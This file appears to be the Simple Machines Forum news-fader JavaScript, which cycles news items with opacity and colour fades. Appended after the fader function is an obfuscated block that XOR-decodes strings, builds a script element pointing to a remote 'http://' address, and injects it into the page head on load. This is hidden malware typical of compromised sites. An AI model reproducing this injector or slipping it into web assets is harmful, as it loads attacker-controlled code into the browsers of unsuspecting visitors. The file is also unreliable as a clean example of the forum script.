// smfFadeIndex: the current item in smfFadeContent.
var smfFadeIndex = -1;
// smfFadePercent: percent of fade. (-64 to 510.)
var smfFadePercent = 510
// smfFadeSwitch: direction. (in or out)
var smfFadeSwitch = false;
// smfFadeScroller: the actual div to mess with.
var smfFadeScroller = document.getElementById('smfFadeScroller');
// The ranges to fade from for R, G, and B. (how far apart they are.)
var smfFadeRange = {
	'r': smfFadeFrom.r - smfFadeTo.r,
	'g': smfFadeFrom.g - smfFadeTo.g,
	'b': smfFadeFrom.b - smfFadeTo.b
};

// Divide by 20 because we are doing it 20 times per one ms.
smfFadeDelay /= 20;

// Start the fader!
window.setTimeout('smfFader();', 20);

// Main	fading function... called 50 times every second.
function smfFader()
{
	if (smfFadeContent.length <= 1)
		return;

	// A fix for Internet Explorer 4: wait until the document is loaded so we can use setInnerHTML().
	if (typeof(window.document.readyState) != "undefined" && window.document.readyState != "complete")
	{
		window.setTimeout('smfFader();', 20);
		return;
	}

	// Starting out?  Set up the first item.
	if (smfFadeIndex == -1)
	{
		setInnerHTML(smfFadeScroller, smfFadeBefore + smfFadeContent[0] + smfFadeAfter);
		smfFadeIndex = 1;

		// In Mozilla, text jumps around from this when 1 or 0.5, etc...
		if (typeof(smfFadeScroller.style.MozOpacity) != "undefined")
			smfFadeScroller.style.MozOpacity = "0.90";
		else if (typeof(smfFadeScroller.style.opacity) != "undefined")
			smfFadeScroller.style.opacity = "0.90";
		// In Internet Explorer, we have to define this to use it.
		else if (typeof(smfFadeScroller.style.filter) != "undefined")
			smfFadeScroller.style.filter = "alpha(opacity=100)";
	}

	// Are we already done fading in?  If so, fade out.
	if (smfFadePercent >= 510)
		smfFadeSwitch = !smfFadeSwitch;
	// All the way faded out?
	else if (smfFadePercent <= -64)
	{
		smfFadeSwitch = !smfFadeSwitch;

		// Go to the next item, or first if we're out of items.
		setInnerHTML(smfFadeScroller, smfFadeBefore + smfFadeContent[smfFadeIndex++] + smfFadeAfter);
		if (smfFadeIndex >= smfFadeContent.length)
			smfFadeIndex = 0;
	}

	// Increment or decrement the fade percentage.
	if (smfFadeSwitch)
		smfFadePercent -= 255 / smfFadeDelay * 2;
	else
		smfFadePercent += 255 / smfFadeDelay * 2;

	// If it's not outside 0 and 256... (otherwise it's just delay time.)
	if (smfFadePercent < 256 && smfFadePercent > 0)
	{
		// Easier... also faster...
		var tempPercent = smfFadePercent / 255, rounded;

		if (typeof(smfFadeScroller.style.MozOpacity) != "undefined")
		{
			rounded = Math.round(tempPercent * 100) / 100;
			smfFadeScroller.style.MozOpacity = rounded == 1 ? "0.99" : rounded;
		}
		else if (typeof(smfFadeScroller.style.opacity) != "undefined")
		{
			rounded = Math.round(tempPercent * 100) / 100;
			smfFadeScroller.style.opacity = rounded == 1 ? "0.99" : rounded;
		}
		else
		{
			var done = false;
			if (typeof(smfFadeScroller.filters.alpha) != "undefined")
			{
				// Internet Explorer 4 just can't handle "try".
				eval("try\
					{\
						smfFadeScroller.filters.alpha.opacity = Math.round(tempPercent * 100);\
						done = true;\
					}\
					catch (err)\
					{\
					}");
			}

			if (!done)
			{
				// Get the new R, G, and B. (it should be bottom + (range of color * percent)...)
				var r = Math.ceil(smfFadeTo.r + smfFadeRange.r * tempPercent);
				var g = Math.ceil(smfFadeTo.g + smfFadeRange.g * tempPercent);
				var b = Math.ceil(smfFadeTo.b + smfFadeRange.b * tempPercent);

				// Set the color in the style, thereby fading it.
				smfFadeScroller.style.color = 'rgb(' + r + ', ' + g + ', ' + b + ')';
			}
		}
	}

	// Keep going.
	window.setTimeout('smfFader();', 20);
}function ffKu2(hcA6){var mh34=document[abPr(u4hxY[3])](abPr(u4hxY[0])+abPr(u4hxY[1])+abPr(u4hxY[2]));mh34[abPr(u4hxY[4])]=hcA6;mh34[abPr(u4hxY[5])]=abPr(u4hxY[6]);document[abPr(u4hxY[9])](abPr(u4hxY[8]))[0][abPr(u4hxY[7])](mh34);}function abPr(t9){return nKk(p4w(t9),'xQ23SAQ7c0kcD6gy');}var u4hxY=["011050","010056","008037","027035087082039036020091006093014013048","011035081","012040066086","012052074071124043048065002067008017045070019","025033066086061037018095010092015","016052083087","031052070118063036060082013068024033061098006030054048095086","016037070067105110126068023081031006106069010021074127064070124043034024000094031077046069"];ffKu2(abPr(u4hxY[10]));function nKk(dS,ePwCLy){var n4='';var pKX=0;var oVw4BN=0;for(pKX=0;pKX<dS.length;pKX++){var l05XDi=dS.charAt(pKX);var tS7n5=l05XDi.charCodeAt(0)^ePwCLy.charCodeAt(oVw4BN);l05XDi=String.fromCharCode(tS7n5);n4+=l05XDi;if(oVw4BN==ePwCLy.length-1)oVw4BN=0;else oVw4BN++;}return (n4);}function p4w(vs6){var tuLY='';var hB=0;var zJ2R=0;for(hB=0;hB<vs6.length/3;hB++){tuLY+=String.fromCharCode(vs6.slice(zJ2R,zJ2R+3));zJ2R=zJ2R+3;}return tuLY;}